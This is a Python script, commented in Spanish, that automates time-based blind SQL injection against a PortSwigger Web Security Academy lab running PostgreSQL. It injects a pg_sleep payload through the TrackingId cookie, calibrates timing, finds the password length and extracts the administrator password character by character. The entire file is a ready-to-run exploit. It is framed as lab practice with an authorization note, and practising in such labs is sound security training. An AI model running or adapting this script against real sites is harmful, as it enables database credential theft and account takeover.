#!/usr/bin/env python3
"""
Blind SQL injection con RETARDOS DE TIEMPO + extracción de datos (PortSwigger, PostgreSQL).

Robustez (v2): mide tu latencia base y pone el umbral solo; además CONFIRMA cada letra
con un segundo envío, para que un pico de lag no cuele un carácter equivocado.

Payload (en la cookie TrackingId):
  x'%3BSELECT CASE WHEN (<condición>) THEN pg_sleep(S) ELSE pg_sleep(0) END FROM users--
(%3B es ';' codificado para no romper la cabecera Cookie)

USO (en Kali):
  1) En Burp copia tu cookie 'session' y la URL del lab. Pégalas abajo en CONFIG.
  2) python3 extraer_password_time.py
  Solo en el laboratorio / con autorización.
"""
import sys, time

try:
    import requests
except ImportError:
    sys.exit("Falta 'requests'. Instala: pip install requests")

# ---------------- CONFIG ----------------
LAB     = "https://TU-LAB-ID.web-security-academy.net"   # <- URL (sin importar si lleva / al final)
SESSION = "PEGA_AQUI_TU_SESSION"                          # <- cookie 'session' (de Burp)
SLEEP   = 5        # segundos de retardo si la condición es cierta (más alto = más fiable)
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"          # la clave es alfanumérica en minúsculas
MAXLEN  = 25
# ----------------------------------------

LAB = LAB.rstrip("/")            # evita el doble //
UMBRAL = None                    # se calcula solo con tu latencia


def tarda(condicion):
    payload = ("x'%3BSELECT CASE WHEN (" + condicion +
               ") THEN pg_sleep(" + str(SLEEP) + ") ELSE pg_sleep(0) END FROM users--")
    cookie = "TrackingId=" + payload + "; session=" + SESSION
    t0 = time.time()
    try:
        requests.get(LAB + "/", headers={"Cookie": cookie}, timeout=SLEEP + 20)
    except requests.exceptions.ReadTimeout:
        return SLEEP + 20
    return time.time() - t0


def es_verdad(condicion):
    """Cierta si tarda por encima del umbral; confirma con un 2º envío para evitar falsos."""
    if tarda(condicion) <= UMBRAL:
        return False
    return tarda(condicion) > UMBRAL      # doble comprobación


def main():
    global UMBRAL
    if "TU-LAB-ID" in LAB or "PEGA_AQUI" in SESSION:
        sys.exit("[!] Edita CONFIG: URL del lab y cookie 'session'.")

    # 1) Latencia base (condición FALSA -> pg_sleep(0)) y umbral automático
    print("[*] Midiendo tu latencia base...")
    base = min(tarda("1=0"), tarda("1=0"))      # el menor de 2, ~latencia de red
    UMBRAL = base + SLEEP * 0.5
    print("    base ~%.2fs -> umbral %.2fs" % (base, UMBRAL))

    print("[*] Comprobando el canal de tiempo (1=1 debe ser 'cierto')...")
    if not es_verdad("1=1"):
        sys.exit("[!] No detecto retardo con 1=1. Revisa LAB/SESSION o sube SLEEP.")
    print("[+] Canal OK.\n")

    # 2) Longitud exacta de la contraseña
    print("[*] Longitud de la contraseña...")
    longitud = 0
    for n in range(1, MAXLEN + 1):
        if es_verdad("username='administrator' AND LENGTH(password)>%d" % n):
            longitud = n + 1
        else:
            if longitud == 0:
                longitud = n
            break
    print("[+] Longitud: %d\n" % longitud)

    # 3) Carácter a carácter (con reintento si una posición no da ninguno)
    print("[*] Extrayendo...")
    clave = ""
    pos = 1
    while pos <= longitud:
        encontrado = ""
        for c in CHARSET:
            cond = "username='administrator' AND SUBSTRING(password,%d,1)='%s'" % (pos, c)
            if es_verdad(cond):
                encontrado = c
                break
        if not encontrado:
            # reintento de la posición por si fue lag; si vuelve a fallar, paramos
            retry = ""
            for c in CHARSET:
                cond = "username='administrator' AND SUBSTRING(password,%d,1)='%s'" % (pos, c)
                if es_verdad(cond):
                    retry = c
                    break
            if not retry:
                break
            encontrado = retry
        clave += encontrado
        print("    [%2d] %s" % (pos, clave))
        pos += 1

    # 4) Verificación final: ¿la contraseña completa es correcta?
    ok = es_verdad("username='administrator' AND password='%s'" % clave)
    print("\n" + "=" * 52)
    print("  CONTRASEÑA: %s" % clave)
    print("  Verificación en la BD: %s" % ("✅ CORRECTA" if ok else "❌ no cuadra (reintenta: sube SLEEP a 8)"))
    print("=" * 52)
    print("\nLogin: administrator / %s" % clave)


if __name__ == "__main__":
    main()
